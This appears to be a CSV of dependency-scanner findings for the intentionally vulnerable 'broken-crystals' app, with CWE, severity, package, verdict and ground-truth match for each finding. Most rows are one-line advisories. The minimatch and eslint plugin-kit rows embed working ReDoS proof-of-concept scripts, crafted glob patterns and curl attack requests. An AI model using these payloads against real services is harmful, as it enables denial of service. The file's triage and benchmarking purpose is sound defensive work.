finding_group_id,tools,target,cwe,severity,location,description,verdict,confidence,ground_truth_match,tool_count
GRP-broken-crystals-CWE-1284-149,trivy,broken-crystals,CWE-1284,high,linux-libc-dev@4.19.269-1,kernel: enic: Validate length of nl attributes in enic_set_vf_port,pending,low,no,1
GRP-broken-crystals-CWE-129-150,trivy,broken-crystals,CWE-129,high,linux-libc-dev@4.19.269-1,kernel: powerpc: Fix access beyond end of drmem array,pending,low,no,1
GRP-broken-crystals-CWE-130-151,trivy,broken-crystals,CWE-130,low,elliptic@6.5.4,elliptic: nodejs/elliptic: ECDSA signature malleability due to missing checks,pending,low,no,1
GRP-broken-crystals-CWE-1303-152,trivy,broken-crystals,CWE-1303,medium,linux-libc-dev@4.19.269-1,kernel: Spectre v2 SMT mitigations problem,pending,low,no,1
GRP-broken-crystals-CWE-131-153,trivy,broken-crystals,CWE-131,high,linux-libc-dev@4.19.269-1,kernel: IGB driver inadequate buffer size for frames larger than MTU,pending,low,no,1
GRP-broken-crystals-CWE-1321-154,npm-audit,broken-crystals,CWE-1321,info,js-yaml,js-yaml has prototype pollution in merge (<<),TP,medium,yes,1
GRP-broken-crystals-CWE-1321-155,npm-audit,broken-crystals,CWE-1321,info,lodash,Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions,TP,medium,yes,1
GRP-broken-crystals-CWE-1321-156,dep-check,broken-crystals,CWE-1321,info,js-yaml:4.1.0,"### Impact In js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted. ### Patches Problem is patched in js-yaml 4.1.1 and 3.14.2. ### Workarounds You can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default). ### References https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",TP,medium,yes,1
GRP-broken-crystals-CWE-1321-157,dep-check,broken-crystals,CWE-1321,info,lodash:4.17.21,### Impact Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. The issue permits deletion of properties but does not allow overwriting their original behavior. ### Patches This issue is patched on 4.17.23.,TP,medium,yes,1
GRP-broken-crystals-CWE-1321-158,trivy,broken-crystals,CWE-1321,medium,js-yaml@4.1.0,js-yaml: js-yaml prototype pollution in merge,TP,medium,yes,1
GRP-broken-crystals-CWE-1321-159,trivy,broken-crystals,CWE-1321,medium,lodash@4.17.21,lodash: prototype pollution in _.unset and _.omit functions,TP,medium,yes,1
GRP-broken-crystals-CWE-1321-160,trivy,broken-crystals,CWE-1321,medium,tough-cookie@2.5.0,tough-cookie: prototype pollution in cookie memstore,TP,medium,yes,1
GRP-broken-crystals-CWE-1325-161,trivy,broken-crystals,CWE-1325,low,libssl-dev@1.1.1n-0+deb10u4,openssl: Unbounded memory growth with session handling in TLSv1.3,pending,low,no,1
GRP-broken-crystals-CWE-1325-162,trivy,broken-crystals,CWE-1325,low,libssl1.1@1.1.1n-0+deb10u4,openssl: Unbounded memory growth with session handling in TLSv1.3,pending,low,no,1
GRP-broken-crystals-CWE-1325-163,trivy,broken-crystals,CWE-1325,low,openssl@1.1.1n-0+deb10u4,openssl: Unbounded memory growth with session handling in TLSv1.3,pending,low,no,1
GRP-broken-crystals-CWE-1333-164,npm-audit,broken-crystals,CWE-1333,info,@babel/helpers,Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups,pending,low,no,1
GRP-broken-crystals-CWE-1333-165,npm-audit,broken-crystals,CWE-1333,high,minimatch,minimatch has a ReDoS via repeated wildcards with non-matching literal in pattern,pending,low,no,1
GRP-broken-crystals-CWE-1333-166,dep-check,broken-crystals,CWE-1333,info,@babel/helpers:7.25.0,"### Impact When using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`). Your generated code is vulnerable if _all_ the following conditions are true: - You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group) - You use the `.replace` method on a regular expression that contains named capturing groups - **Your code uses untrusted strings as the second argument of `.replace`** If you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if: - you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 - you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 You can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug). ### Patches This problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version. Please note that just updating your Babel dependencies is not enough: you will also need to re-compile your code. ### Workarounds If you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between). ### References This vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",pending,low,no,1
GRP-broken-crystals-CWE-1333-167,dep-check,broken-crystals,CWE-1333,low,@eslint/plugin-kit:0.2.2,"Crafting a very large and well crafted string can increase the CPU usage and crash the program. ## POC ```js const { ConfigCommentParser } = require(""@eslint/plugin-kit""); var str = """"; for (var i = 0; i < 1000000; i++) { str += "" ""; } str += ""A""; console.log(""start"") var parser = new ConfigCommentParser(); console.log(parser.parseStringConfig(str, """")); console.log(""end"") // run `npm i @eslint/plugin-kit` and `node attack.js` // then the program will stuck forever with high CPU usage ```",pending,low,no,1
GRP-broken-crystals-CWE-1333-168,dep-check,broken-crystals,CWE-1333,high,cross-spawn:7.0.3,Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.,pending,low,no,1
GRP-broken-crystals-CWE-1333-169,dep-check,broken-crystals,CWE-1333,high,minimatch:3.1.2,"### Summary Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally. --- ### Details The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group: ```typescript : this.type === '*' && bodyDotAllowed ? `)?` : `)${this.type}` ``` This produces the following regexps: | Pattern | Generated regex | |----------------------|------------------------------------------| | `*(a\|b)` | `/^(?:a\|b)*$/` | | `*(*(a\|b))` | `/^(?:(?:a\|b)*)*$/` | | `*(*(*(a\|b)))` | `/^(?:(?:(?:a\|b)*)*)*$/` | | `*(*(*(*(a\|b))))` | `/^(?:(?:(?:(?:a\|b)*)*)*)*$/` | These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`. The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration. Measured times via `minimatch()`: | Pattern | Input | Time | |----------------------|--------------------|------------| | `*(*(a\|b))` | `a` x30 + `z` | ~68,000ms | | `*(*(*(a\|b)))` | `a` x20 + `z` | ~124,000ms | | `*(*(*(*(a\|b))))` | `a` x25 + `z` | ~116,000ms | | `*(a\|a)` | `a` x25 + `z` | ~2,000ms | Depth inflection at fixed input `a` x16 + `z`: | Depth | Pattern | Time | |-------|----------------------|--------------| | 1 | `*(a\|b)` | 0ms | | 2 | `*(*(a\|b))` | 4ms | | 3 | `*(*(*(a\|b)))` | 270ms | | 4 | `*(*(*(*(a\|b))))` | 115,000ms | Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level. --- ### PoC Tested on minimatch@10.2.2, Node.js 20. **Step 1 -- verify the generated regexps and timing (standalone script)** Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`: ```javascript import { minimatch, Minimatch } from 'minimatch' function timed(fn) { const s = process.hrtime.bigint() let result, error try { result = fn() } catch(e) { error = e } const ms = Number(process.hrtime.bigint() - s) / 1e6 return { ms, result, error } } // Verify generated regexps for (let depth = 1; depth <= 4; depth++) { let pat = 'a|b' for (let i = 0; i < depth; i++) pat = `*(${pat})` const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString() console.log(`depth=${depth} ""${pat}"" -> ${re}`) } // depth=1 ""*(a|b)"" -> /^(?:a|b)*$/ // depth=2 ""*(*(a|b))"" -> /^(?:(?:a|b)*)*$/ // depth=3 ""*(*(*(a|b)))"" -> /^(?:(?:(?:a|b)*)*)*$/ // depth=4 ""*(*(*(*(a|b))))"" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/ // Safe-length timing (exponential growth confirmation without multi-minute hang) const cases = [ ['*(*(*(a|b)))', 15], // ~270ms ['*(*(*(a|b)))', 17], // ~800ms ['*(*(*(a|b)))', 19], // ~2400ms ['*(*(a|b))', 23], // ~260ms ['*(a|b)', 101], // <5ms (depth=1 control) ] for (const [pat, n] of cases) { const t = timed(() => minimatch('a'.repeat(n) + 'z', pat)) console.log(`""${pat}"" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`) } // Confirm noext disables the vulnerability const t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true })) console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`) // +() is equally affected const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))')) console.log(`""+(+(+(a|b)))"" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`) ``` Observed output: ``` depth=1 ""*(a|b)"" -> /^(?:a|b)*$/ depth=2 ""*(*(a|b))"" -> /^(?:(?:a|b)*)*$/ depth=3 ""*(*(*(a|b)))"" -> /^(?:(?:(?:a|b)*)*)*$/ depth=4 ""*(*(*(*(a|b))))"" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/ ""*(*(*(a|b)))"" n=15: 269ms result=false ""*(*(*(a|b)))"" n=17: 268ms result=false ""*(*(*(a|b)))"" n=19: 2408ms result=false ""*(*(a|b))"" n=23: 257ms result=false ""*(a|b)"" n=101: 0ms result=false noext=true: 0ms (should be ~0ms) ""+(+(+(a|b)))"" n=18: 6300ms result=false ``` **Step 2 -- HTTP server (event loop starvation proof)** Save as `poc4-server.mjs`: ```javascript import http from 'node:http' import { URL } from 'node:url' import { minimatch } from 'minimatch' const PORT = 3001 http.createServer((req, res) => { const url = new URL(req.url, `http://localhost:${PORT}`) const pattern = url.searchParams.get('pattern') ?? '' const path = url.searchParams.get('path') ?? '' const start = process.hrtime.bigint() const result = minimatch(path, pattern) const ms = Number(process.hrtime.bigint() - start) / 1e6 console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=""${pattern}"" path=""${path.slice(0,30)}""`) res.writeHead(200, { 'Content-Type': 'application/json' }) res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n') }).listen(PORT, () => console.log(`listening on ${PORT}`)) ``` Terminal 1 -- start the server: ``` node poc4-server.mjs ``` Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately: ``` curl ""http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz"" & ``` Terminal 3 -- send a benign request while the attack is in-flight: ``` curl -w ""\ntime_total: %{time_total}s\n"" ""http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz"" ``` **Observed output -- Terminal 2 (attack):** ``` {""result"":false,""ms"":""64149""} ``` **Observed output -- Terminal 3 (benign, concurrent):** ``` {""result"":false,""ms"":""0""} time_total: 63.022047s ``` **Terminal 1 (server log):** ``` [2026-02-20T09:41:17.624Z] pattern=""*(*(*(a|b)))"" path=""aaaaaaaaaaaaaaaaaaaz"" [2026-02-20T09:42:21.775Z] done in 64149ms result=false [2026-02-20T09:42:21.779Z] pattern=""*(a|b)"" path=""aaaz"" [2026-02-20T09:42:21.779Z] done in 0ms result=false ``` The server reports `""ms"":""0""` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps. Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact. --- ### Impact Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here. Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard. `+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed). **Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.",pending,low,no,1
GRP-broken-crystals-CWE-1333-170,trivy,broken-crystals,CWE-1333,medium,ajv@6.12.6,ajv: ReDoS via $data reference,pending,low,no,1
GRP-broken-crystals-CWE-1333-171,trivy,broken-crystals,CWE-1333,medium,ajv@8.12.0,ajv: ReDoS via $data reference,pending,low,no,1
GRP-broken-crystals-CWE-1333-172,trivy,broken-crystals,CWE-1333,high,ansi-regex@3.0.0,nodejs-ansi-regex: Regular expression denial of service (ReDoS) matching ANSI escape codes,pending,low,no,1
GRP-broken-crystals-CWE-1333-173,trivy,broken-crystals,CWE-1333,high,ansi-regex@4.1.0,nodejs-ansi-regex: Regular expression denial of service (ReDoS) matching ANSI escape codes,pending,low,no,1
GRP-broken-crystals-CWE-1333-174,trivy,broken-crystals,CWE-1333,high,cross-spawn@5.1.0,cross-spawn: regular expression denial of service,pending,low,no,1
GRP-broken-crystals-CWE-1333-175,trivy,broken-crystals,CWE-1333,high,find-my-way@7.5.0,find-my-way: ReDoS vulnerability in multiparametric routes,pending,low,no,1
GRP-broken-crystals-CWE-1333-176,trivy,broken-crystals,CWE-1333,high,http-cache-semantics@3.8.1,http-cache-semantics: Regular Expression Denial of Service (ReDoS) vulnerability,pending,low,no,1
GRP-broken-crystals-CWE-1333-177,trivy,broken-crystals,CWE-1333,medium,micromatch@3.1.10,micromatch: vulnerable to Regular Expression Denial of Service,pending,low,no,1
GRP-broken-crystals-CWE-1333-178,trivy,broken-crystals,CWE-1333,medium,micromatch@4.0.5,micromatch: vulnerable to Regular Expression Denial of Service,pending,low,no,1
GRP-broken-crystals-CWE-1333-179,trivy,broken-crystals,CWE-1333,high,minimatch@3.1.2,minimatch: minimatch: Denial of Service via specially crafted glob patterns,pending,low,no,1
GRP-broken-crystals-CWE-1333-180,trivy,broken-crystals,CWE-1333,high,minimatch@5.1.6,minimatch: minimatch: Denial of Service via specially crafted glob patterns,pending,low,no,1
GRP-broken-crystals-CWE-1333-181,trivy,broken-crystals,CWE-1333,high,path-to-regexp@3.2.0,path-to-regexp: Backtracking regular expressions cause ReDoS,pending,low,no,1
GRP-broken-crystals-CWE-1333-182,trivy,broken-crystals,CWE-1333,high,path-to-regexp@6.2.1,path-to-regexp: Backtracking regular expressions cause ReDoS,pending,low,no,1
GRP-broken-crystals-CWE-1333-183,trivy,broken-crystals,CWE-1333,high,semver@5.7.1,nodejs-semver: Regular expression denial of service,pending,low,no,1
